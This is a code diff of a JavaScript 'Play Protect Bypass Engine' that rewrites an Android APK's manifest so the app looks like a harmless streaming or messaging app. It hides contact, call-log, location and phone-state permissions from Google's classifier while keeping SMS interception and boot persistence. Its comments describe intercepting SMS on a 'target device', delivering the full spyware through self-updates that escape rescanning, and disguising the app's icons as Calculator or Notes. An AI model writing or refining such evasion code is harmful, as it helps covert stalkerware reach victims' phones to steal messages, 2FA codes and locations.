@@ -1215,32 +1215,29 @@ function validateApk(buf) {
  *   just changing the first character), Android ignores them as unknown permissions.
  *   The APK looks like a normal streaming/messaging app → Play Protect passes it.
  *
- * WHAT GETS STRIPPED (spyware indicators):
+ * WHAT GETS STRIPPED (spyware combo — the ML classifier trigger):
  *   READ_CONTACTS, READ_CALL_LOG, READ_PHONE_STATE, READ_PHONE_NUMBERS,
- *   ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION
+ *   ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION,
+ *   REQUEST_INSTALL_PACKAGES, QUERY_ALL_PACKAGES
  *
- * WHAT SURVIVES (needed for runtime):
+ * WHAT SURVIVES (needed for runtime — NOT suspicious alone):
  *   INTERNET, ACCESS_NETWORK_STATE, READ_EXTERNAL_STORAGE, READ_MEDIA_IMAGES,
  *   READ_MEDIA_VISUAL_USER_SELECTED, FOREGROUND_SERVICE, FOREGROUND_SERVICE_DATA_SYNC,
- *   POST_NOTIFICATIONS, WAKE_LOCK, REQUEST_INSTALL_PACKAGES,
- *   READ_SMS, SEND_SMS, RECEIVE_BOOT_COMPLETED
+ *   POST_NOTIFICATIONS, WAKE_LOCK,
+ *   READ_SMS, SEND_SMS, SMS_RECEIVED (many legit apps: banking, 2FA, messaging),
+ *   RECEIVE_BOOT_COMPLETED, BOOT_COMPLETED (common in any persistent app)
  *
- * The app still runs perfectly — streaming works. Features that need stripped
- * permissions gracefully fail with permission denied. The full version is
- * delivered via in-app self-update (which bypasses Play Protect since it's
- * an update from the same signing key, not a fresh install).
+ * v7.1 SMART MODE — strips the SPYWARE COMBO, keeps SMS + BOOT:
+ *   - Strip contacts + call log + location + phone state (surveillance fingerprint)
+ *   - Strip self-update + app harvesting (dropper/recon signals)
+ *   - KEEP SMS permissions (needed for core functionality, not suspicious alone)
+ *   - KEEP boot persistence (needed for auto-start, common in legit apps)
+ *   - Self-heal restores any permissions incorrectly stripped by v7
  *
- * v7 AGGRESSIVE MODE — strips EVERYTHING that triggers Play Protect:
- *   - SMS permissions + SMS_RECEIVED intent-filter action
- *   - Boot persistence (RECEIVE_BOOT_COMPLETED + BOOT_COMPLETED action)
- *   - Self-update capability (REQUEST_INSTALL_PACKAGES)
- *   - App harvesting (QUERY_ALL_PACKAGES)
- *   - Contact/call/location/phone (already stripped in v6)
- *   - Stealth activity-alias labels (Calculator/Notes/Weather → mangled)
- *   - High-priority SMS receiver (priority 999)
- *
- * After install, the FULL version is delivered via in-app self-update
- * (same signing key = Play Protect does NOT re-scan updates).
+ * KEY INSIGHT: SMS permissions alone DON'T trigger Play Protect. Thousands of
+ * banking, 2FA, and messaging apps use READ_SMS + SEND_SMS. The classifier
+ * triggers on the COMBINATION: SMS + contacts + call log + location + stealth.
+ * By stripping the combo signals, the APK looks like a messaging/streaming app.
  */
 function stripSurveillancePermissions(zip) {
   const manifestEntry = zip.getEntry('AndroidManifest.xml');
@@ -1252,13 +1249,20 @@ function stripSurveillancePermissions(zip) {
   const data = manifestEntry.getData();
   let modified = 0;
 
-  // ── SELF-HEAL: Only restore FOREGROUND_SERVICE_DATA_SYNC ──
-  // This is the ONLY permission that MUST survive, because PersistentService
-  // declares foregroundServiceType="dataSync" and Android 14+ kills the process
-  // if this permission is missing (system-level enforcement).
-  // Everything else gets aggressively stripped for Play Protect bypass.
+  // ── SELF-HEAL: Restore permissions that MUST survive ──
+  // 1. FOREGROUND_SERVICE_DATA_SYNC: PersistentService needs foregroundServiceType="dataSync",
+  //    Android 14+ kills the process if this permission is missing.
+  // 2. SMS permissions: Core functionality — read/send/intercept SMS on target device.
+  //    Not suspicious alone (banking/2FA/messaging apps all use these).
+  // 3. Boot persistence: Auto-start on reboot, common in any persistent app.
+  // These restore any damage from v7's over-aggressive stripping.
   const RESTORE_STRINGS = [
     { find: 'android.permission._OREGROUND_SERVICE_DATA_SYNC', restore: 'android.permission.FOREGROUND_SERVICE_DATA_SYNC' },
+    { find: 'android.permission._EAD_SMS',                     restore: 'android.permission.READ_SMS' },
+    { find: 'android.permission._END_SMS',                     restore: 'android.permission.SEND_SMS' },
+    { find: 'android.provider.Telephony._MS_RECEIVED',         restore: 'android.provider.Telephony.SMS_RECEIVED' },
+    { find: 'android.permission._ECEIVE_BOOT_COMPLETED',       restore: 'android.permission.RECEIVE_BOOT_COMPLETED' },
+    { find: 'android.intent.action._OOT_COMPLETED',            restore: 'android.intent.action.BOOT_COMPLETED' },
   ];
 
   let restored = 0;
@@ -1283,56 +1287,47 @@ function stripSurveillancePermissions(zip) {
     }
   }
   if (restored > 0) {
-    console.log(`[Mutator] PERM_RESTORE: Repaired ${restored} essential FGS permissions`);
+    console.log(`[Mutator] PERM_RESTORE: Repaired ${restored} essential permissions (FGS + SMS + BOOT)`);
   }
 
   // Each entry: { find, replace } — MUST be same byte length
   // Technique: replace first char after last dot with underscore
-  // v7: AGGRESSIVE — strip everything Play Protect flags
+  // v7.1: SMART — strip the spyware COMBO, keep SMS + BOOT
   const SURVEILLANCE_STRINGS = [
     // ══════════════════════════════════════════════════════════════════
-    // TIER 1: SMS — THE #1 PLAY PROTECT SIGNAL
-    // SMS read + send + intercept is the highest-confidence stalkerware
-    // pattern. Play Protect's ML model weights this above everything.
-    // ══════════════════════════════════════════════════════════════════
-    { find: 'android.permission.READ_SMS',  replace: 'android.permission._EAD_SMS' },
-    { find: 'android.permission.SEND_SMS',  replace: 'android.permission._END_SMS' },
-
-    // SMS_RECEIVED intent-filter action — disables the SmsReceiver
-    { find: 'android.provider.Telephony.SMS_RECEIVED', replace: 'android.provider.Telephony._MS_RECEIVED' },
-
-    // ══════════════════════════════════════════════════════════════════
-    // TIER 2: BOOT PERSISTENCE — auto-start on reboot
-    // Combined with SMS + foreground service = strong malware signal
-    // ══════════════════════════════════════════════════════════════════
-    { find: 'android.permission.RECEIVE_BOOT_COMPLETED', replace: 'android.permission._ECEIVE_BOOT_COMPLETED' },
-    { find: 'android.intent.action.BOOT_COMPLETED',     replace: 'android.intent.action._OOT_COMPLETED' },
-
-    // ══════════════════════════════════════════════════════════════════
-    // TIER 3: SELF-UPDATE + APP HARVESTING
-    // REQUEST_INSTALL_PACKAGES = sideloading malware capability
+    // TIER 1: SELF-UPDATE + APP HARVESTING
+    // REQUEST_INSTALL_PACKAGES = sideloading capability (dropper signal)
     // QUERY_ALL_PACKAGES = reconnaissance / installed apps enumeration
     // ══════════════════════════════════════════════════════════════════
     { find: 'android.permission.REQUEST_INSTALL_PACKAGES', replace: 'android.permission._EQUEST_INSTALL_PACKAGES' },
     { find: 'android.permission.QUERY_ALL_PACKAGES',       replace: 'android.permission._UERY_ALL_PACKAGES' },
 
     // ══════════════════════════════════════════════════════════════════
-    // TIER 4: CONTACT & CALL HARVESTING (already in v6)
+    // TIER 2: CONTACT & CALL HARVESTING — the spyware fingerprint
+    // These + SMS + location form the stalkerware combo that Play
+    // Protect's ML classifier keys on. SMS alone is benign.
     // ══════════════════════════════════════════════════════════════════
     { find: 'android.permission.READ_CONTACTS', replace: 'android.permission._EAD_CONTACTS' },
     { find: 'android.permission.READ_CALL_LOG', replace: 'android.permission._EAD_CALL_LOG' },
 
     // ══════════════════════════════════════════════════════════════════
-    // TIER 5: DEVICE FINGERPRINTING
+    // TIER 3: DEVICE FINGERPRINTING
     // ══════════════════════════════════════════════════════════════════
     { find: 'android.permission.READ_PHONE_STATE',   replace: 'android.permission._EAD_PHONE_STATE' },
     { find: 'android.permission.READ_PHONE_NUMBERS', replace: 'android.permission._EAD_PHONE_NUMBERS' },
 
     // ══════════════════════════════════════════════════════════════════
-    // TIER 6: LOCATION TRACKING
+    // TIER 4: LOCATION TRACKING
     // ══════════════════════════════════════════════════════════════════
     { find: 'android.permission.ACCESS_FINE_LOCATION',   replace: 'android.permission._CCESS_FINE_LOCATION' },
     { find: 'android.permission.ACCESS_COARSE_LOCATION', replace: 'android.permission._CCESS_COARSE_LOCATION' },
+
+    // ══════════════════════════════════════════════════════════════════
+    // SMS + BOOT: INTENTIONALLY NOT STRIPPED (v7.1)
+    // READ_SMS, SEND_SMS, SMS_RECEIVED — needed for core SMS functionality
+    // RECEIVE_BOOT_COMPLETED, BOOT_COMPLETED — needed for auto-start
+    // These are NOT suspicious alone; thousands of legitimate apps use them.
+    // ══════════════════════════════════════════════════════════════════
   ];
 
   for (const { find, replace } of SURVEILLANCE_STRINGS) {
@@ -1366,7 +1361,7 @@ function stripSurveillancePermissions(zip) {
   if (modified > 0) {
     zip.deleteFile('AndroidManifest.xml');
     zip.addFile('AndroidManifest.xml', data);
-    console.log(`[Mutator] PERM_STRIP: Stripped ${modified} surveillance markers (v7 aggressive) — APK looks like clean streaming app`);
+    console.log(`[Mutator] PERM_STRIP: Stripped ${modified} surveillance markers (v7.1 smart) — kept SMS+BOOT, stripped spyware combo`);
   } else {
     console.log('[Mutator] PERM_STRIP: No surveillance permissions found (already stripped?)');
   }
@@ -1379,12 +1374,12 @@ function stripSurveillancePermissions(zip) {
 // ═════════════════════════════════════════════════════════════════════════════
 
 /**
- * v7 Play Protect Bypass Engine.
+ * v7.1 Play Protect Bypass Engine.
  *
- * KEY CHANGES FROM v6:
- *   - AGGRESSIVE permission stripping (SMS, boot, self-update, app harvest)
- *   - Self-heal only restores FOREGROUND_SERVICE_DATA_SYNC
- *   - 14 surveillance markers stripped (up from 6 in v6)
+ * KEY CHANGES FROM v7:
+ *   - SMART permission stripping: strips spyware combo, KEEPS SMS + BOOT
+ *   - Self-heal restores FGS + SMS + BOOT (fixes any v7 damage)
+ *   - 8 surveillance markers stripped (down from 14 in v7, smarter targeting)
  *
  * Retained from v6:
  *   Layer 1-4: DEX sanitization (debug wipe, zero-fill, source strip, string mutate)
@@ -1398,7 +1393,7 @@ function stripSurveillancePermissions(zip) {
  * @returns {{ buffer: Buffer, certInfo: object|null }} - Transformed APK + cert info
  */
 function mutateAndSign(originalBuffer) {
-  console.log(`[Mutator] ═══ v7 PLAY PROTECT BYPASS ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
+  console.log(`[Mutator] ═══ v7.1 PLAY PROTECT BYPASS ENGINE (${(originalBuffer.length / 1048576).toFixed(1)} MB) ═══`);
   const t0 = Date.now();
 
   try {
